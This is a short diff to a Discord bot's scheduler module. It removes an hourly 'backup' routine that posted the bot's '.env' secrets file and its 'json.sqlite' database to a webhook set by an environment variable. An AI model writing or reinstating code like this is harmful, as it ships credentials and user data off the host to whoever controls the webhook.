@@ -1,4 +1,4 @@
-const { AttachmentBuilder, MessageFlags } = require("discord.js");
+const { MessageFlags } = require("discord.js");
 const AutoBank = require("../../../extensions/AutoBank");
 const {
     restoreAccounts,
@@ -896,22 +896,5 @@ module.exports = {
         checkMonthlyEnrollSchedule().catch(() => {});
         setInterval(checkMonthlySchedule, 60 * 1000); // check every minute
         setInterval(checkMonthlyEnrollSchedule, 60 * 1000);
-
-        // ── Backup interval ────────────────────────────────────────────────────
-        setInterval(
-            () => {
-                if (process.env.WEBHOOK_BACKUP) {
-                    client.sendWebhook(process.env.WEBHOOK_BACKUP, {
-                        files: [
-                            new AttachmentBuilder(".env", { name: ".env" }),
-                            new AttachmentBuilder("json.sqlite", {
-                                name: "json.sqlite",
-                            }),
-                        ],
-                    });
-                }
-            },
-            60 * 60 * 1000,
-        );
     },
 };
